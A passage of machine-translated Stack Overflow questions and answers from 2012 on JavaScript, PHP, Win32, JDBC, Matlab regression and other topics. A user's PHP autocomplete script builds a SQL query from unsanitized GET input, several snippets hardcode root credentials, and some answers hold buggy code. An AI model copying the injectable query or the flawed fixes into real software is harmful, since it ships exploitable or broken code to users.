GZipStream 类不适合读取 .gz 或 .zip 格式的压缩档案。它只*知道*如何解压缩数据，对存档文件结构一无所知。其中可以包含多个文件，请注意该类如何无法选择要解压缩的存档中的特定文件。

.NET 4.5 中将添加 Zip 存档支持。在此之前，您可以使用流行的 SharpZipLib 或 DotNetZip 库。谷歌他们的名字找到下载。

如果您要解压缩的文件实际上是由 GZipStream 生成的，那么执行该操作的代码中有一个错误，我们看不到它。

# google-chrome - 每次在Ubuntu linux上打开github时Chrome都会崩溃

> ID：11271285
> 
> 赞同：2
> 
> 时间：2012-06-30T03:59:19.627
> 
> 标签：google-chrome, github

由于 github 使用 webfront 作为图标，每次我打开 github 网站时，该选项卡都会崩溃。但其他网站没有崩溃。

我做了我能做的一切，比如禁用所有扩展，清理所有缓存，甚至创建一个新的用户配置文件，但仍然无法正常工作。

我使用的是 Ubuntu linux 12.04，这是最后一个稳定的谷歌 chrome 浏览器，总是最新的。

我从谷歌搜索并没有发现任何人有像我这样的问题。

我发现任何使用[Font-Awesome](http://fortawesome.github.com/Font-Awesome/)的网站，如果我打开该网站，我的 chrome 标签都会崩溃。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-04-02T21:50:04.870

我遇到过这个问题。从那以后我一直在使用 Chromium。Chromium 解决了我所有的问题。您可以在软件中心获得它。

# javascript - 如何使数组动态化？

> ID：11271286
> 
> 赞同：1
> 
> 时间：2012-06-30T03:59:22.637
> 
> 标签：javascript, arrays

我正在用 PHP 做一个网站并有一个图形模块。我已经完成了图形模块，其中 x 轴值和 y 轴值作为数组传递，如下所示：

```
<script type="text/javascript">
    var chart;
    var chartData = [{
        year: 2005,
        income: 23.5
    }, {
        year: 2006,
        income: 26.2
    }, {
        year: 2007,
        income: 30.1
    }, {
        year: 2008,
        income: 29.5
    }, {
        year: 2009,
        income: 24.6
    }];
</script> 
```

如何在 JavaScript 中使这个数组动态化？

我在这里添加了代码：http: [//jsfiddle.net/soumyamohanan/YDmnR/7/](http://jsfiddle.net/soumyamohanan/YDmnR/7/)但它不起作用，所以我已将图表上传到服务器：[http ://rapidsurfing.net/mivotv/graph/bar3D .html](http://rapidsurfing.net/mivotv/graph/bar3D.html)

任何帮助都会被接受。

**编辑：** 更新的小提琴可以在[这里](http://jsfiddle.net/arunpjohny/YDmnR/8/)找到。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T04:09:28.980

根据您的评论，这应该是您想要的：

```
var year = [2010, 2011, 2012, 2013, 2014],   //assuming you have these 2 arrays
    income = [20, 21, 22, 23, 24],
    chartData = [];

for(var i = 0;i<year.length;i++){
    chartData.push({
        "year": year[i],
        "income": income[i]
    });
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-06-30T04:14:49.593

```
var chartData = new Array();
var yearlySalaryObject = {
     year : 2012,
    salary : 100000
};
chartData.push(yearlySalary); 
```

This is the basic idea of what you are trying to do. Since it seems like the underlying concept isn't clear here goes: What you want to do is fill the array with a number of objects. Each object has the 'properties' year and salary. These can be added dynamically to an array using push. All arrays are dynamic in javascript. Arrays in javascript can be used as numerous different data structures. You can also just do.

```
var chartData = new Array();
chartData.push({ year : 2012, salary : 100000}); 
```

*NOTE: I think I severely misunderstood the question...but I am still not certain of that :) if so I don't know how to delete this answer. You should really consider rephrasing and fixing that fiddle though....

Essentially { } denotes an object and [ ] denotes array. That is why you can do what you have above. In fact, you can do as you have above and then push more of the objects into the array. Hopefully that makes sense.

# objective-c - 使用 stringByAppendingString 连接 ID 类型的字符串

> ID：11271291
> 
> 赞同：2
> 
> 时间：2012-06-30T04:00:40.703
> 
> 标签：objective-c, nsstring, nsmutablearray

大约一周前我开始了 Objective-C 编程，并且一直坚持从传递给函数的字符串数组创建一个新字符串。我已经对此进行了彻底的研究，似乎无法弄清楚为什么我可以使用`stringByAppendingString`一次（检查`NSLog`）但不能第二次使用而不抛出此错误：

感谢您的关注。

> 2012-06-29 20:46:35.761 计算器[32883:f803]-[__NSCFNumber stringByAppendingString:]：无法识别的选择器发送到实例 0x6e43d50
> 
> 2012-06-29 20:46:35.763 计算器 [32883:f803] ***由于未捕获的异常“NSInvalidArgumentException”而终止应用程序，原因：“-[__NSCFNumber stringByAppendingString:]：无法识别的选择器发送到实例 0x6e43d50”

```
+ (NSString *)descriptionOfTopOfStack:(NSMutableArray *)stack
{
    NSString *result;
    NSString *displayString = [[NSString alloc]init];
    id topOfStack = [stack lastObject];
    if (topOfStack) [stack removeLastObject];

    if ([self isNoOperandOperation:topOfStack]) {
        displayString = [displayString stringByAppendingString:topOfStack];
        result = displayString;
        }
    else if ([self isOperation:topOfStack]){
        id nextInStack = [stack lastObject];
        if (topOfStack) [stack removeLastObject];
        displayString = [displayString stringByAppendingString:nextInStack];
        displayString = [displayString stringByAppendingString:topOfStack];
        result = displayString; 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T04:05:38.097

stringByAppendingString 是 NSString 的一个方法，你必须将你的 displayString 作为 NSString 返回，

```
+ (NSString *)descriptionOfTopOfStack:(NSMutableArray *)stack
{
NSLog(@"stack array :: %@",stack);
NSString *result;
NSString *displayString = [[NSString alloc]init];
id topOfStack = [stack lastObject];
if (topOfStack) [stack removeLastObject];

NSLog(@"topOfStack :: %@", (NSString*)topOfStack);

if ([self isNoOperandOperation:topOfStack]) {
    displayString = [[(NSNumber*)displayString stringValue] 
                                stringByAppendingString:(NSString*)topStack];
    result = displayString;
    }
else if ([self isOperation:topOfStack]){
    id nextInStack = [stack lastObject];
    if (topOfStack) [stack removeLastObject];
    displayString = [[(NSNumber*)displayString stringValue] 
                                stringByAppendingString:(NSString*)nextInStack];
    displayString = [[(NSNumber*) displayString stringValue] 
                                stringByAppendingString:(NSString*)topStack];
    result = displayString; 
```

编辑：stringByAppendingString 方法需要 NSString 的参数类型，您的 topOfStack 是类型 ID，假设您的 topOfStack 是字符串，您需要将其类型转换为 NSString，与 nextInStack 相同

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:05:50.730

您需要`id`先将您的转换为字符串。对于 NSNumbers，您可以使用`-stringValue`.

# php - 具有自动完成功能的多文本字段，但为什么只有第一个

> ID：11271294
> 
> 赞同：0
> 
> 时间：2012-06-30T04:01:39.283
> 
> 标签：php, javascript, autocomplete

使用自动完成 javascript：

```
<link rel="stylesheet" type="text/css" href="j query/js/jquery.autocomplete.css" />
<script type="text/javascript" src="j query/js/jquery.autocomplete.js"></script>{/literal}
<script type="text/javascript">
    $().ready(function() {
        $(".id_perkiraan").autocomplete("j query/js/cari.php",{width:350, max:28, scroll:false });
    });
</script> 
```

html：

```
<tr>
    <td width="75">
        <div class="demo">
            <div>
                <p><input type="text" name="id_perkiraan[]" class="id_perkiraan" size=75 autocomplete="off"></p>
            </div>
        </div>
        <div class="pilihan"></div> 
    </td>
    <td><input type ='text' name='keterangan[]' size="20"></td>
    <td><input type ='text' name='debet[]' size="20" ></td>
    <td><input type ='text' name='kredit[]' size="20" ></td>
</tr> 
<tr>
    <td width="75">
        <div class="demo">
            <div>
                <p><input type="text" name="id_perkiraan[]" class="id_perkiraan" size=75 autocomplete="off"></p>
            </div>
        </div>
        <div class="pilihan"></div> 
    </td>
    <td><input type ='text' name='keterangan[]' size="20"></td>
    <td><input type ='text' name='debet[]' size="20" ></td>
    <td><input type ='text' name='kredit[]' size="20" ></td>
</tr> 
```

和 cari.php ：

```
<?
mysql_connect("localhost","root","root");
mysql_select_db("siakud");

$q = strtolower($_GET["q"]);
if (!$q) return;
    $query = mysql_query("select * from perkiraan where id_perkiraan LIKE '%$q%'");
    while($r = mysql_fetch_array($query)) 
    {  
        $id = $r['id_perkiraan'];
        $nama = $r['nama'];
        echo "$id [$nama] \n";
    }
?> 
```

但不知何故，只有一个“id_perkiraan”文本字段具有自动完成功能……第二个、第三个 adn 等“id_perkiraan”怎么样？？？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T04:31:44.533

试试这个....

您只使用“id.perkiraan”，jquery 中不使用其他文本字段

哪个文本字段想要自动完成，使用 keyup，其他合适的功能

```
$(".id_perkiraan").autocomplete(...)
$("other").autocomplete(...) 
```

我已经尝试使用自动完成插件..我已经更改了“框”值，完成了多个文本字段访问。所以你试试你的代码..

```
function check(na)
{
    var tmp=document.getElementById(na).value;
    box='#'+na; 
    $.ajax({
    type: 'POST',
    url:  'fetch.php',
    data: "val="+tmp,
    success: function(data) 
    {   
        if(data!="")
        {
            //$('#err_register').html(data);
            var data1=data.split(','); // alert(data1.length);
            //$('#pname').focus().autocomplete(data1);
            $(box).focus().autocomplete(data1); 
        }

    } 
    });
} 
```

# c++ - Win32 C++：显示列表框的内容

> ID：11271295
> 
> 赞同：0
> 
> 时间：2012-06-30T04:02:56.673
> 
> 标签：c++, winapi, listbox

我正在尝试使用 SendMessage 函数显示列表框的内容。但是，当我按下按钮执行下面的代码时，当我调用时，我的代码中出现以下段错误

```
SendMessage(hwndLBox,LB_GETTEXT,k,(LPARAM)lBoxitems); 
```

段错误（dbgheap.c）：

```
extern "C" _CRTIMP int __cdecl _CrtIsValidHeapPointer(
        const void * pUserData
        )
 {
        if (!pUserData)
            return FALSE;

        if (!_CrtIsValidPointer(pHdr(pUserData), sizeof(_CrtMemBlockHeader), FALSE))
            return FALSE;

        return HeapValidate( _crtheap, 0, pHdr(pUserData) );
} 
```

导致此段错误的代码：

```
 else if(LOWORD(wParam)==ID_BUTTON_CALC){

                int getLboxitems = SendMessage(hwndLBox,LB_GETCOUNT,NULL,NULL);

                char * lBoxitems = new char[getLboxitems];

                for(unsigned int k=0; k < getLboxitems; k++){
                        SendMessage(hwndLBox,LB_GETTEXT,k,(LPARAM)lBoxitems);
                        MessageBox(hwnd,lBoxitems,"Listbox says",NULL);
                }

                delete[] lBoxitems;
            } 
```

我正在使用 Visual Studio Beta 2011 来编译我的代码。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T04:44:02.690

您需要为字符串分配空间。`char * lBoxitems = new char[getLboxitems];`分配一个 char 数组，该数组是您在列表中拥有的项目数的大小。我认为以下应该有效：

```
else if(LOWORD(wParam)==ID_BUTTON_CALC)
{
    int getLboxitems = SendMessage(hwndLBox, LB_GETCOUNT, NULL, NULL);

    char ** lBoxitems = new char*[getLboxitems];

    for(unsigned int k = 0; k < getLboxitems; k++)
    {
        int textlength = SendMessage(control, LB_GETTEXTLEN, (WPARAM)k, NULL);
        lBoxitems[k] = new char[textlength + 1]; // +1 for null terminator
        SendMessage(hwndLBox, LB_GETTEXT, (WPARAM)k, (LPARAM)lBoxitems[k]);
        MessageBox(hwnd, lBoxitems[k], "Listbox says" , NULL);
    }
    for (unsigned int k = 0; k < getLboxitems; k++)
    {
        delete [] lBoxitems[k];
    }
    delete[] lBoxitems;
} 
```

但是，使用`std::vector<std::vector<char>>`or`std::vector<std::string>`会更容易：

```
else if(LOWORD(wParam)==ID_BUTTON_CALC)
{
    int getLboxitems = SendMessage(hwndLBox, LB_GETCOUNT, NULL, NULL);

    std::vector<std::string> v(getLboxitems);

    for(unsigned int k = 0; k < getLboxitems; k++)
    {
        int textlength = SendMessage(control, LB_GETTEXTLEN, (WPARAM)k, NULL);
        v[k].resize(textlength + 1);
        std::string& buff = v[k];
        SendMessage(hwndLBox, LB_GETTEXT, (WPARAM)k, (LPARAM)&buff[0]);
        MessageBox(hwnd, v[k].c_str(), "Listbox says" , NULL);
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:24:26.907

我看到的两件事

1.  您是否已验证 getLboxitems 是一个有效值（即既不 <= 0）还是大得离谱？

2.  在这种情况下，我认为您没有正确使用数组。您创建一个大小为 getLboxitems 的动态大小的数组，这意味着如果您的列表框中有 5 个项目，您将有效地创建一个包含五个 char 的数组（而不是您假设的 char* 或 char[]）。您需要以这种方式创建数组：

    ```
    // verify with MSDN that 255 is large enough
    char* lBoxitems[255] = new char[getLboxitems][255];
    for(unsigned int k=0; k < getLboxitems; k++) {
        SendMessage(hwndLBox, LB_GETTEXT, k, (LPARAM)(lBoxitems[k]));
        MessageBox(hwnd, lBoxitems[k], "Listbox says", NULL);
    } 
    ```

当心，未经测试的代码。

编辑：感谢 Jesse Good 的纠正。

另外我想指出，这种方法不是很 C++-y。您可能想要使用`std::vector<std::string>`2D 数组而不是 2D 数组，并且只使用要在 SendMessage() 中使用的临时数组。

# google-maps-api-3 - Google Places API - place_changed 监听器不起作用

> ID：11271300
> 
> 赞同：5
> 
> 时间：2012-06-30T04:04:10.207
> 
> 标签：google-maps-api-3

我正在尝试使用 Google Places API 中的自动完成功能。我已经设置并工作了自动完成本身，但我想添加一个侦听器，以便我可以在其他地方使用来自 PlacesResult 的信息。

为了测试功能，我试图通过打开一个警报框并将 place.name 写入 . 这两件事都不起作用，所以我想监听器显然配置错误，但我不知道我是怎么写错的。

```
<!-- Load Places Library for Google Maps-->
<script type="text/javascript" src="http://maps.googleapis.com/maps/api/js?libraries=places&sensor=false">
</script>

<!-- Autocomplete Script -->
<script type="text/javascript">
function initialize(){
    var input = document.getElementById('name');
    var autocomplete = new google.maps.places.Autocomplete(input);
}
google.maps.event.addDomListener(window, 'load', initialize);

google.maps.event.addListener(autocomplete, 'place_changed', function(){
    var place = autocomplete.getPlace();
    alert("This function is working!");
    document.getElementById("receiver").innerHTML=place.name;
});
</script> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T04:52:59.143

将调用移动**`addListener`**到**`initialize`**。

否则**`addListener`**会在之前被调用 **`initialize`**，**`autocomplete`**此时在这个范围内是未知的（它不是全局的）

# css - Lightbox Plus captions spill over

> ID：11271301
> 
> 赞同：0
> 
> 时间：2012-06-30T04:04:11.733
> 
> 标签：css, wordpress, lightbox

I am using Lightbox Plus for Wordpress. My captions are spilling over and overlapping the picture when the image is in lightbox mode. The captions are covering the image and the close link, as well as being off-center. Here is my URL: [http://dev.andreamarymarshall.com/archives/2012-2/](http://dev.andreamarymarshall.com/archives/2012-2/)

How do I make the space allowed for the captions bigger, so that in fits at least two lines of text without overlapping anything?

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-30T15:12:28.073

看起来您在其他图像页面上使用的是不同的灯箱插件。可能是Thickbox/Colorbox，因为它们似乎使用不同的CSS，并且缺少prev/next。

最好检查您是否有任何其他插件或检查工作图像页面的高级设置，以查看是否在某处使用了自定义类。

希望这可以帮助 ;）

# visual-studio - Visual Studio：一步构建多个配置？

> ID：11271304
> 
> 赞同：12
> 
> 时间：2012-06-30T04:04:40.947
> 
> 标签：visual-studio, visual-studio-2010, visual-studio-2012, visual-studio-2013, visual-studio-2015

我有几个我想一步运行的项目的构建配置。目前我必须手动构建每个配置（调试、配置文件、发布配置），这越来越烦人。我可以使用命令行功能吗？这将使它“稍微”容易一些，因为我可以告诉脚本构建每个配置，而不管启动的配置是什么（我已经在为库和头文件的构建结束分发执行此操作）。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-06-30T04:06:25.530

使用菜单中的*Build->Batch Build...。*这将允许您构建/重建/清理所有配置的子集，或所有配置。

# ruby-on-rails - 你如何设置这个 rspec 例子有并且属于许多关联

> ID：11271305
> 
> 赞同：0
> 
> 时间：2012-06-30T04:04:47.893
> 
> 标签：ruby-on-rails, rspec

在 Rspec 中为我的 rails 应用程序构建此断言时遇到问题。A`User`与 有一个 habtm 关联`Role`，我想断言，在我的测试之后，用户应该与标题为“超级用户”的角色相关联。在导轨控制台中。

```
user.roles.where(title: "Superuser").any?
=> true 
```

在 rspec 中我想说的是'用户有一个名为“超级用户”的角色'

谢谢，

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-06-30T04:20:57.023

像这样的东西怎么样：

```
user.roles.where(title: "Superuser").should_not be_empty 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-02-11T06:34:20.797

我一直在寻找设置一个规范来`has_and_belongs_to_many`自己测试两个模型之间的关系。如果有人想测试这种关系，这可能对他们有帮助：

```
it "should have and belong many to Categories" do
  assc = described_class.reflect_on_association(:categories)
  expect(assc.macro).to eq :has_and_belongs_to_many
end 
```

# java - JDBC Connector Issues

> ID：11271307
> 
> 赞同：-1
> 
> 时间：2012-06-30T04:05:28.043
> 
> 标签：java, jdbc

I'm having trouble using the JDBC Connector. I got it to work in Eclipse but it doesn't seem to work from command line. I re-named the connector "driver.jar" and put it into a /lib directory in the folder of my Main class. I even set the class path to the /lib/driver.jar but that doesn't seem to do the trick. Can someone please advise me on how to setup the JDBC so that I can connect to a MySQL database. This is really frustrating.

Sample Code:

```
import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;

public class Main {
    public static void main(String args[]) {
        // Database credentials
        Connection conn = null;
        String url = "jdbc:mysql://localhost/";
        String db = "db";
        String driver = "com.mysql.jdbc.Driver";
        // Connect to database
        try {
            Class.forName(driver);
            System.out.println("HELLO");
            conn = DriverManager.getConnection(url+db,"root","");
            System.out.println("Success");
            } catch(Exception e) {
            return;
        }
    }

} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-06-30T08:05:38.553

我同意@Mark Rotteveel 将 jar 文件放入 lib\ext\ 不是一个优雅的解决方案。

您可以尝试@AVD 的建议，但使用“：”作为分隔符，因为您在 Mac OSX 上运行程序。

示例（假设您的 Main.class 和 lib/ 在同一文件夹中）：

```
>java -cp .:./lib/driver.jar Main 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-30T04:24:35.887

试试下面的代码，要获得连接，请在 getConnection() 方法中用你的用户名和密码替换。尝试解决这个问题，如果它适合你，那么请看看你的代码有什么问题。

```
public class DBDiary {

    Connection conn;

    public DBDiary(){

        this.getConn();

    }

    public Connection getConn(){

        try {
            conn = getConnection();

        } catch (SQLException e) {

            System.out.println("Connection Couldnt be Obtained");
        }
           return conn;
    }

    public static Connection getConnection() throws SQLException {

        String drivers = "com.mysql.jdbc.Driver";
        String url = "jdbc:mysql://localhost:3306/test";
        String username = "root";
        String password = "root";

        System.setProperty(drivers,"");

        return DriverManager.getConnection(url,username,password);

    }

   } 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T04:57:53.033

如果您正在开发桌面应用程序，则需要将其放入 Eclipse 中的项目构建路径中

如果您正在开发 Web 应用程序，例如 Web 服务或其他东西，那么您需要将此文件添加到该文件 project_folder\WebContent\WEB-INF\lib 中，它将起作用。然后你可以像@Arun P Johny 所说的那样与 mysql 通信。还是有问题再写信给我。

* * *

## 回答 #4

> 赞同：-4
> 
> 时间：2012-06-30T04:19:53.230

我希望，它无法找到 MYSQL 的驱动程序库文件。

尝试这个

复制 JRE/lib/ext 中的 driver.jar

前任。C:\Program Files\Java\jre1.5.0\lib\ext

# javascript - Javascript code will not run at all

> ID：11271315
> 
> 赞同：-5
> 
> 时间：2012-06-30T04:07:30.207
> 
> 标签：javascript, html

I was trying to sun some javascript on my html page but it doesn't not run at all. I tried to just change the words in a `<p>` tag but nothing happened. I know javascript is enabled on my browser. Here is my code, I can't seem to find anything wrong with it.

```
<!DOCTYPE html>
<html>
<head>

</head>
<body>
    <h1> Eat Page</h1>
    <p id="test">Hi</p>
    <select id="CusineList"></select>

    <script type="text/javascript">
        document.getElementIdBy("test").innerHTML = "Who";
    </script>

    <p> When </p>
</body>

</html> 
```

Note- I am running this file off a folder on my desktop

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-06-30T04:09:51.173

```
document.getElementById("test").innerHTML = "Who"; 
```

NOT

```
document.getElementIdBy("test").innerHTML = "Who"; 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-06-30T04:09:41.073

Javascript has no function `getElementIdBy`, you have spelled it wrong. You should use `document.getElementById`.

**Wrong sytnax**

```
 document.getElementIdBy("test").innerHTML = "Who"; 
```

**Correct syntax**

```
 document.getElementById("test").innerHTML = "Who"; 
```

**You script block should be**

```
<script type="text/javascript">
        document.getElementById("test").innerHTML = "Who";
</script> 
```

**Note:** As you are concerned about that you are running file from desktop its absolutely correct in your case.

On more advice put the script block just before the closing tag of body instead of putting it between the HTML. It makes the code bit messy.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-06-30T04:13:45.973

这是正确的代码，

```
document.getElementById("test").innerHTML = "Who"; 
```

您输入错误：

```
document.getElementIdBy("test").innerHTML = "Who"; 
```

检查此链接：http: [//jsfiddle.net/Q3eMV/](http://jsfiddle.net/Q3eMV/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-06-30T04:15:02.067

呃，应该是`getElementById`，不是`getElementIdBy`。下次，在询问之前查看[MDN 文档。](https://developer.mozilla.org/en/DOM/document.getElementById)

```
document.getElementById("test").innerHTML = "Who"; 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-12T12:14:22.970

您应该注意文档加载，因为您是在没有任何事件的情况下直接加载 javascript。如果您先加载脚本然后再加载 div，即使您确实犯了任何语法错误，您也肯定会遇到问题。

它应该在所有文档都加载后加载。

如果您使用的是 jQuery，则可以在`$.ready()`函数内运行脚本。

# devexpress - How do I programmatically merge data in DevExpress RichEditControl?

> ID：11271316
> 
> 赞同：2
> 
> 时间：2012-06-30T04:07:55.567
> 
> 标签：devexpress, mailmerge, richedit-control

I want to allow users to select from a list of predefined templates. When a template is selected, the RichEditControl (REC) displays a document formatted according to the selected template, with fields already merged. (The user never sees the double-bracket "code-behind" of the merge document.) My templates are in a database as varbinary and passed up to the gui as byte arrays in a class that, stripped down, looks like this:

```
public class Template
{
  public byte[] Document {get;set;}
} 
```

In the form that contains the REC, I'm calling the following method in the event handler for the changed event of the drop-down that contains the available templates (the letterWriterEditor is my REC, and the templateBindingSource is bound to the LetterWriterMergeFieldCollection, a class containing string properties representing the fields I'd like to have the option of merging in the document, along with their values for this particular letter (determined elsewhere in the program)):

```
 public void MergeTemplateFieldsWithValues(IList<LetterWriterMergeFieldCollection> mergeValues, Template template)
    {
        using (Stream s = new MemoryStream(template.Document))
        {
            letterWriterEditor.LoadDocument(s, DocumentFormat.Rtf);
        }

        BindingList<LetterWriterMergeFieldCollection> bindingList = new BindingList<LetterWriterMergeFieldCollection>(mergeValues);
        templateBindingSource.DataSource = bindingList;
        templateBindingSource.ResetBindings(false);
    } 
```

I have the following statement in this form's constructor:

```
 letterWriterEditor.Options.MailMerge.ViewMergedData = true; 
```

The merge fields are bound fine: I can insert them manually using one of the Mailings buttons in the REC's ribbon bar. But the document ends up blank when I attempt to do it programmatically. I'd like it to end up as a merged letter ready for saving as soon as the user selects the desired template. My understanding is that, with the ViewMergeData property set to true, this is what should be happening.

If anyone has any ideas, I'd be grateful. Thanks in advance.

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-10T19:18:33.030

I'm currently doing something similar, in my case I load the template inside a RichEditDocumentServer (which is like a RichEditControl but with no UI) then set the DataSource of MailMerge, after that just call the RichEditDocumentServer's MailMerge method and give the RichEditControl's document as parameter.

RichEditDocumentServer loads the template and does the MailMerge then displays the document in the RichEditControl of the Form.

You can try this:

Declare a RichEditDocumentServer in your Form.

```
RichEditDocumentServer docServer; 
```

And initialize it in your form contructor or OnLoad.

```
docServer = New RichEditDocumentServer(); 
```

Then just change your method like this:

```
public void MergeTemplateFieldsWithValues(IList<LetterWriterMergeFieldCollection> mergeValues, Template template)
    {
        using (Stream s = new MemoryStream(template.Document))
        {
        docServer.LoadDocument(s, DocumentFormat.Rtf);
    }

    BindingList<LetterWriterMergeFieldCollection> bindingList = new BindingList<LetterWriterMergeFieldCollection>(mergeValues);
    templateBindingSource.DataSource = bindingList;
    templateBindingSource.ResetBindings(false);
} 
```

I'm not sure where did you Bind your Fields to the document but I think templateBindingSource does it so just have to set the DataSource of docServer:

```
docServer.DataSource = templateBindingSource; 
```

after that just do the MailMerge and display it using your form letterWriterEditor:

```
docServer.MailMerge(letterWriterEditor.Document); 
```

It should work. :)

# winapi - How do I find LoadLibrary and GetProcAddress inside the loaded kernel32.dll?

> ID：11271317
> 
> 赞同：1
> 
> 时间：2012-06-30T04:08:10.003
> 
> 标签：winapi, memory, assembly, kernel32

I am trying to make a small win32 "Hello, world!" application in pure assembly. Now after looking around on how to even locate the `kernel32.dll`, I, after some time, found this: [http://skypher.com/wiki/index.php/Hacking/Shellcode/kernel32](http://skypher.com/wiki/index.php/Hacking/Shellcode/kernel32). This technique returns a pointer to where `kernel32.dll` is located in memory.

Now on a different website where a similar technique was presented, they wrote

> Now all you need to do is locate the "LoadLibrary" and "GetProcAddress" functions in there and you're good to go!

Of course, this is true. I could easily write any win32 application if I only had the exact jump location of these two functions.

Does anyone know how to locate the two (or technically, only "GetProcAddress" would do) in that DLL? Or are there any cheap alternatives (besides using a higher-level language)?

Thanks in advance,

-Kierrow

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-06-30T15:43:50.937

由于您找到了如何检索指向 kernel32.dll 的指针，因此您可以遍历 kernel32 的导出表并查找“GetProcAddress”。一旦你得到指向函数的指针，就调用它。正如 Raymond Chen 所说，要做到这一点，只需看看[Portable Executable Format 规范](http://msdn.microsoft.com/en-us/library/windows/hardware/gg463119.aspx)。

# matlab - Gradient descent and normal equation method for solving linear regression gives different solutions

> ID：11271318
> 
> 赞同：6
> 
> 时间：2012-06-30T04:08:20.743
> 
> 标签：matlab, machine-learning, linear-regression, gradient-descent

I'm working on machine learning problem and want to use linear regression as learning algorithm. I have implemented 2 different methods to find parameters `theta` of linear regression model: Gradient (steepest) descent and Normal equation. On the same data they should both give approximately equal `theta` vector. However they do not.

Both `theta` vectors are very similar on all elements but the first one. That is the one used to multiply vector of all 1 added to the data.

Here is how the `theta`s look like (fist column is output of Gradient descent, second output of Normal equation):

```
Grad desc Norm eq
-237.7752 -4.6736
-5.8471   -5.8467
9.9174    9.9178
2.1135    2.1134
-1.5001   -1.5003
-37.8558  -37.8505
-1.1024   -1.1116
-19.2969  -19.2956
66.6423   66.6447
297.3666  296.7604
-741.9281 -744.1541
296.4649  296.3494
146.0304  144.4158
-2.9978   -2.9976
-0.8190   -0.8189 
```

What can cause the difference in `theta(1, 1)` returned by gradient descent compared to `theta(1, 1)` returned by normal equation? Do I have bug in my code?

Here is my implementation of normal equation in Matlab:

```
function theta = normalEque(X, y)
    [m, n] = size(X);
    X = [ones(m, 1), X];
    theta = pinv(X'*X)*X'*y;
end 
```

Here is code for gradient descent:

```
function theta = gradientDesc(X, y)
    options = optimset('GradObj', 'on', 'MaxIter',  9999);
    [theta, ~, ~] = fminunc(@(t)(cost(t, X, y)),...
                    zeros(size(X, 2), 1), options);
end

function [J, grad] = cost(theta, X, y)
    m = size(X, 1);
    X = [ones(m, 1), X];
    J = sum((X * theta - y) .^ 2) ./ (2*m);
    for i = 1:size(theta, 1)
        grad(i, 1) = sum((X * theta - y) .* X(:, i)) ./ m;
    end
end 
```

I pass exactly the same data `X` and `y` to both functions (I do not normalize `X`).

## Edit 1:

Based on answers and comments I checked few my code and run some tests.

First I want to check if the problem can be cause by X beeing near singular as suggested by [@user1489497's answer](https://stackoverflow.com/a/11271797/311865). So I replaced pinv by inv - and when run it I really got warning `Matrix is close to singular or badly scaled.`. To be sure that that is not the problem I obtained much larger dataset and run tests with this new dataset. This time `inv(X)` did not display the warning and using `pinv` and `inv` gave same results. So I hope that **`X` is not close to singular any more**.

Then **I changed `normalEque` code as suggested** by [woodchips](https://stackoverflow.com/users/85109/woodchips) so now it looks like:

```
function theta = normalEque(X, y)
    X = [ones(size(X, 1), 1), X];
    theta = pinv(X)*y;
end 
```

**However the problem is still there**. New `normalEque` function on new data that are not close to singular gives different `theta` as `gradientDesc`.

To find out which algorithm is buggy I have run linear regression algorithm of data mining software Weka on the same data. Weka computed theta very similar to output of `normalEque` but different to the output of `gradientDesc`. So I guess that `normalEque` is correct and **there is a bug in `gradientDesc`**.

Here is comparison of `theta`s computed by Weka, `normalEque` and `GradientDesc`:

```
Weka(correct) normalEque    gradientDesc
779.8229      779.8163      302.7994
  1.6571        1.6571        1.7064
  1.8430        1.8431        2.3809
 -1.5945       -1.5945       -1.5964
  3.8190        3.8195        5.7486
 -4.8265       -4.8284      -11.1071
 -6.9000       -6.9006      -11.8924
-15.6956      -15.6958      -13.5411
 43.5561       43.5571       31.5036
-44.5380      -44.5386      -26.5137
  0.9935        0.9926        1.2153
 -3.1556       -3.1576       -1.8517
 -0.1927       -0.1919       -0.6583
  2.9207        2.9227        1.5632
  1.1713        1.1710        1.1622
  0.1091        0.1093        0.0084
  1.5768        1.5762        1.6318
 -1.3968       -1.3958       -2.1131
  0.6966        0.6963        0.5630
  0.1990        0.1990       -0.2521
  0.4624        0.4624        0.2921
-12.6013      -12.6014      -12.2014
 -0.1328       -0.1328       -0.1359 
```

I also computed errors as suggested by [Justin Peel's answer](https://stackoverflow.com/a/11271748/311865). Output of `normalEque` gives slightly lesser squared error but the difference is marginal. What is more **when I compute gradient of cost of `theta` using function `cost` (the same as the one used by `gradientDesc`) I got gradient near zero**. Same done on output of `gradientDesc` does not give gradient near zero. Here is what I mean:

```
>> [J_gd, grad_gd] = cost(theta_gd, X, y, size(X, 1));
>> [J_ne, grad_ne] = cost(theta_ne, X, y, size(X, 1));
>> disp([J_gd, J_ne])
  120.9932  119.1469
>> disp([grad_gd, grad_ne])
  -0.005172856743846  -0.000000000908598
  -0.026126463200876  -0.000000135414602
  -0.008365136595272  -0.000000140327001
  -0.094516503056041  -0.000000169627717
  -0.028805977931093  -0.000000045136985
  -0.004761477661464  -0.000000005065103
  -0.007389474786628  -0.000000005010731
   0.065544198835505  -0.000000046847073
   0.044205371015018  -0.000000046169012
   0.089237705611538  -0.000000046081288
  -0.042549228192766  -0.000000051458654
